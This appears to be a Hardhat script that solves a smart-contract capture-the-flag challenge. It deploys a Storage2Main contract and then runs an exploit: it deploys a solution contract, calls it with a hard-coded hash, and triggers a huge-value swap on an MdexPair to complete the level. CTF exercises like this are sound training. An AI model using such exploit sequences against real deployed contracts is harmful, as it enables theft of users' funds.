const { ethers } = require("hardhat");
const { expect } = require("chai");

async function deploy(deployer) {
    const Storage2Main = await ethers.getContractFactory(
        "Storage2Main",
        deployer
    );
    const storage2Main = await Storage2Main.deploy();
    console.log("Storage2Main contract:", storage2Main.address);
    return storage2Main;
}

async function exploit(storage2Main, attacker) {
    const Storage2MainSolution = await ethers.getContractFactory(
        "Storage2MainSolution",
        attacker
    );

    const solution = await Storage2MainSolution.deploy(storage2Main.address);
    const MdexPair = await ethers.getContractFactory(
        "contracts/challenge13/Pair.sol:MdexPair"
    );

    const mdexPair = await MdexPair.attach(await storage2Main.pair());
    console.log("Solution contract:", solution.address);
    await solution
        .connect(attacker)
        .expliot(
            "0x2ec7574ace48108340e39e2a8f8d23c4156d8d2d6fb2f6c1c31561becd0e922b"
        );
    await mdexPair
        .connect(attacker)
        .swap(
            "999999999999999999999999999999999999999999999999",
            0,
            solution.address,
            "0x1234"
        );
    await storage2Main.connect(attacker).isComplete();

}

async function main() {
    let [deployer, attacker] = await ethers.getSigners();
    let storage2Main = await deploy(deployer);
    console.log(attacker.address)
    await exploit(storage2Main, attacker);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
